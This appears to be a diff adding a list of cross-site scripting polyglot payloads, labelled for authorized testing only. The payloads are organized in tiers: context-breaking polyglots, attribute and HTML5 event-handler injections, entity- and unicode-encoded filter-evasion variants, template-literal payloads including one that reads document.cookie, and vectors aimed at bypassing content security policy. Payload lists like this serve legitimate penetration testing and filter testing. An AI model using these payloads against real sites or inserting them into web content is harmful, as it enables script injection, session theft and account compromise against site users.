@@ -1,0 +1,85 @@
+# XSS Polyglot Payloads
+# Works across multiple injection contexts simultaneously
+# For authorized testing only
+
+# =========================================
+# TIER 1 — Classic Polyglots
+# =========================================
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+
+'"><img src=x onerror=alert(1)>
+
+'"><svg/onload=alert(1)>
+
+\";alert(1);//
+
+</script><script>alert(1)</script>
+
+# =========================================
+# TIER 2 — Attribute Context Polyglots
+# =========================================
+
+" onmouseover="alert(1)
+
+' onmouseover='alert(1)
+
+`onmouseover=alert(1)`
+
+" autofocus onfocus="alert(1)
+
+# =========================================
+# TIER 3 — HTML5 Event Polyglots
+# =========================================
+
+<details open ontoggle=alert(1)>
+
+<video autoplay onplay=alert(1)><source src=1></video>
+
+<audio autoplay onplay=alert(1)><source src=1></audio>
+
+<body onpageshow=alert(1)>
+
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+<marquee onstart=alert(1)>XSS</marquee>
+
+<input autofocus onfocus=alert(1)>
+
+<select autofocus onfocus=alert(1)>
+
+# =========================================
+# TIER 4 — Encoding Variants
+# =========================================
+
+# HTML Decimal Entities
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+
+# HTML Hex Entities
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# Unicode escape
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+
+# URL encoded (double)
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+# =========================================
+# TIER 5 — Template Literal Payloads
+# =========================================
+
+alert`1`
+
+setTimeout`alert\x28document.cookie\x29`
+
+Function`alert\x281\x29```
+
+# =========================================
+# TIER 6 — CSP-Friendly (no inline script)
+# =========================================
+
+<link rel=import href=data:text/html,<script>alert(1)</script>>
+
+<object data="javascript:alert(1)">
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
